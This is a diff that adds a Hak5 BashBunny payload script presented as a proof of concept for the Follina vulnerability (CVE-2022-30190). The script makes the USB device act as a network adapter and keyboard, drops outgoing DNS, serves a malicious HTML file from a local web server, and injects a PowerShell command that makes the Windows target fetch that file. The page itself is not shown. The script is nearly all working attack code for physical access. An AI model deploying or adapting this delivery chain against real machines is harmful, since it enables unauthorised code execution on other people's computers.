@@ -1,0 +1,38 @@
+#!/bin/bash
+# Title:          PoC Follina Execution via BashBunny
+# Description:    Serves up a malicious website that leverages the current CVE-2022-30190 aka Follina
+# Author:         PanicAcid
+# Version:        1.0
+# Category:       Execution
+# Target:         Windows (Powershell 5.1+)
+# Attackmodes:    RNDIS_ETHERNET HID
+# Props:          Based on Cribbit's Moo payload https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/prank/Win_PoSH_AnsiSebsCow
+#			Example payload taken from https://greynolds.me.uk/ - https://greynolds.me.uk/poc.html
+# Notes:		This WILL flag on Defender if you're up to date, however the PoC here isn't that you can just run this code, it's that you can self serve 
+#			this malicious html file via the BashBunny and you can tweak it to your hearts content.
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so server starts immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# attack commences
+LED ATTACK
+QUACK DELAY 200
+RUN WIN powershell.exe "wget http://$HOST_IP/payload.html"
+QUACK DELAY 500
+LED FINISH
